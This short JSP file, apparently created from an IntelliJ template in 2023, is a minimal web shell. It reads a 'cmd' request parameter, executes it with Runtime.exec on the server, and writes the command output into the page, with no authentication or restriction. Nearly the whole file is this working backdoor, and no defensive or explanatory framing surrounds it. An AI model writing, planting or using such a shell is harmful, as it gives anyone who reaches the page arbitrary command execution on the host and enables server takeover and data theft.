<%--
  Created by IntelliJ IDEA.
  User: 游俊豪
  Date: 2023/4/21
  Time: 11:39
  To change this template use File | Settings | File Templates.
--%>
<%
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("pre");
    while ((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.println("</pre>");
%>

